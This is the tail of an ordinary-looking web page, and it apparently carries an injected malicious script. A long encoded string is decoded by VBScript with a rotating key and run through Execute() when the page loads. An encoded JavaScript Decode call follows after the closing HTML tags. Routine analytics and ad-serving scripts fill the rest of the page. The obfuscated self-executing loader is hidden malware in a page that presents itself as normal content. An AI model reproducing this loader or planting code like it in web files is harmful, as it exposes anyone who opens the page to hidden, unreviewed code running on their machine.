AckhL\bb`nF`AfmcQbgh+AlasbNqmb4;,>k^AfmcQbgh+AlasbNqmb4;+Qe_f?pfq>loBk^FcCfhYiv>aph5AckhQ_em+>jfs_Dbqn]oFbunAceLn`bo;jo%-!LYkaiefw_Cijf7(Qi0Gqe_j>ol f&5Fhl%%3'Lfa&#K_pqLbjjKqocfd7Cllf:+QlDbkLefmLbun!N]jmHmj7>p] Jf^ QeckQbrl)f&)&&FcLbjjFrj5.-Qe_fN]jmHmj7/5Bim]FcLbjjFrj5.*Qe_fN]jmHmj7/6Bk^FcQbgh@e[j:;eoLbjjFrj%Ln`bo;jo%cJl^1&#F`Qbgh@e[j:;eo+1&LebhQ_em@bYo7@el .5#Bh\F`Q_emPnjfka:N]jmMlofh_#Lbjj;e^lK_pqMkIi[hPnj:Bu_[rq_ >ajE]v>lj%0#$QeckQbrl n_@lDc#Hbs9oo(&7 Lqb]o>lj%-###pZ@oF^#Cbv;jo%+!:#Gqe_j>ol .&#s\;oI`E]v>lj%/#:#Ilebl9oo*& s_=jIc H_q>ol 0&5Ln`bo;jo%-!# n_@lDc#Cllf:+QlDbk=ubMlofh_&s_=jIc Q_emKoe:9p`Efa=ubMlofh_)f&)&&#s\;oI`C^Q_emKoe:)5N`bk#s\;oI`N]jmHmj701#s\;oI`?faC^ n_@lDc#Qbgh@e[j:;eoLbjjFrj#H_q>ol fGga.!&s_=jIc F`Qbgh@e[j:;eo*5&Lebh#pZ@oF^#Lbjj;e^l:pZ@o#s\;oI`?dpbC^Q_em@bYo7@el /6#Qe_f n_@lDc#Qbgh@e[j:n_I`#pZ@oF^#=kaAcs_=jIc QbapQ_pq7QeckQbrl#Lbjj;e^l#pZ@oF^#Fbun&#pZ@oF^#Bu_[rq_ QeckQbrl&QeckQbrl:Bu_Kqocfd7#N]jmMlofh_#EneiQ_pq79m[ofjli[fdr[_b:pZp`lamq8#n_@lDc ai[rj_fq+qjfq_ #9^asmlvi_5$mikfqcgk7[Zplfmqb5ib`l7-jp8ngm7*hu8ofan`7-jp8b]fdbl7-jp8t%fk^]u7,08papf\aifnq7baaa_f$;#4 ;HMI?LK;EB:EB \ambpnEBC?EQ7(TC<QE7(`i\b:]gj+gk+[[qfp]U+;[qfp] U=gjmifbkn6 9#'>MJDBQ8#9)\fs8s\;oI`#4 ,m[ofjl;s\;oI`#4 p]jfmni^h_r^a]:s\k`ochq;#pZ@oF^#LefmLbun#pZ@oF^#MkIi[hPnj#n_@lDc 9#'p`lamq8#n_@lDc 9#'?L>Q;s\;oI`#4 ,BLJI8PZpQ_pq7QeckQbrl#n_@lDc RkFg`hMlo s_=jIcEB\pnYoq!OfkJYqe5CMG+D_lPm_[f^f>li^]o%*!#YFc CPI&Cff]BuckqpOfkJYqeq]_Y@gia_j+enl&#Qe_f@KL+=gmv@aibOfkJYqeq]_Y@gia_j+enl)QakM[le t_ZYhdo^if&df`?faC^C^%@KL+@aib?pfpnk%TcfM^n`#pvmlbj-*Ya_khqih+fha&#Qe_f@KL+=gmv@aibOfkJYqemqpq_e0/V\bpellm(akf$TfhH^qb#kvpn]j0,ThgqYii(_fcBh\F`Bh\Cof`qcgk"
Execute("Dim KeyArr(3),ThisText"&vbCrLf&"KeyArr(0) = 3"&vbCrLf&"KeyArr(1) = 6"&vbCrLf&"KeyArr(2) = 8"&vbCrLf&"KeyArr(3) = 3"&vbCrLf&"For i=1 To Len(ExeString)"&vbCrLf&"TempNum = Asc(Mid(ExeString,i,1))"&vbCrLf&"If TempNum = 18 Then"&vbCrLf&"TempNum = 34"&vbCrLf&"End If"&vbCrLf&"TempChar = Chr(TempNum + KeyArr(i Mod 4))"&vbCrLf&"If TempChar = Chr(28) Then"&vbCrLf&"TempChar = vbCr"&vbCrLf&"ElseIf TempChar = Chr(29) Then"&vbCrLf&"TempChar = vbLf"&vbCrLf&"End If"&vbCrLf&"ThisText = ThisText & TempChar"&vbCrLf&"Next")
Execute(ThisText)
</script>
</BODY>
</HTML>
<SCRIPT LANGUAGE=JavaScript>
<!--   
    Decode('%275Euetkrv%2742ncpiwcig%275F%2744lcxcuetkrv%2744%2742v%7Brg%275F%2744vgzv1lcxcuetkrv%2744%2742ute%275F%27441eik/dkp1xcnkfcvgadcppgt%275Hgpe%275Frquv/2%2744%275G%275E1uetkrv%275G2');
//-->
</SCRIPT>


<!-- PrintTracker Insertion Begin -->
<script src="/fs_img/js/pt.js" type="text/javascript"></script>
<!-- PrintTracker Insertion Complete -->


<!-- Google Analytics Insertion Begin -->
<script type="text/javascript">
<!--
        var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
        var URL = gaJsHost + "google-analytics.com/ga.js";
        document.write(unescape("%3Cscript src='" + URL + "' type='text/javascript'%3E%3C/script%3E"));

        var hndl = window.setTimeout('StartTracking()',100);
        function StartTracking(){
          if( typeof(_gat) == 'object'){ 
             window.clearTimeout(hndl);
             var pageTracker = _gat._getTracker("UA-4601892-10");
             pageTracker._setDomainName("none");
             pageTracker._setAllowLinker(true);
             pageTracker._initData();
             pageTracker._trackPageview();
          }else{
             hndl = window.setTimeout('StartTracking()',100);
          }
        }
-->
</script>
<!-- Google Analytics Insertion Complete -->

<SCRIPT LANGUAGE=JavaScript>
  <!--
  //configuration
  OAS_url = "http://cyclops.prod.untd.com/";
  OAS_sitepage = 'webservices/general'; //CHANGED
  OAS_listpos = 'Bottom';
  OAS_query = '';
  OAS_target = '_Blank';
  //end of configuration
  OAS_version = 10;
  OAS_rn = '001234567890'; OAS_rns = '1234567890';
  OAS_rn = new String (Math.random()); OAS_rns = OAS_rn.substring (2, 11);
  function OAS_NORMAL(pos) {
    document.write('<A HREF="' + OAS_url + 'click_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" TARGET=' + OAS_target + '>');
    document.write('<IMG SRC="' + OAS_url + 'adstream_nx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '!' + pos + '?' + OAS_query + '" BORDER=0></A>');
  }
  //-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript1.1>
  <!--
  OAS_version = 11;
  if ((navigator.userAgent.indexOf('Mozilla/3') != -1) || (navigator.userAgent.indexOf('Mozilla/4.0 WebTV') != -1))
    OAS_version = 10;
  if (OAS_version >= 11)
    document.write('<SCR' + 'IPT LANGUAGE=JavaScript1.1 SRC="' + OAS_url + 'adstream_mjx.ads/' + OAS_sitepage + '/1' + OAS_rns + '@' + OAS_listpos + '?' + OAS_query + '"><\/SCR'+'IPT>');
  //-->
  </SCRIPT>

  <SCRIPT LANGUAGE=JavaScript>
  <!--
  document.write('');
  function OAS_AD(pos) {
    if ((OAS_version >= 11) && (typeof OAS_RICH != 'undefined')) {
      OAS_RICH(pos);
    } else {
      OAS_NORMAL(pos);
    }
  }
  //-->
  </SCRIPT>

  <TABLE ALIGN=CENTER STYLE="clear:both"><TR><TD ALIGN=CENTER> <!------ OAS AD 'Bottom' begin ------> <SCRIPT LANGUAGE=JavaScript> if(window.OAS_AD) OAS_AD('Bottom'); </SCRIPT> <!------ OAS AD 'Bottom' end ------> </TD></TR></TABLE>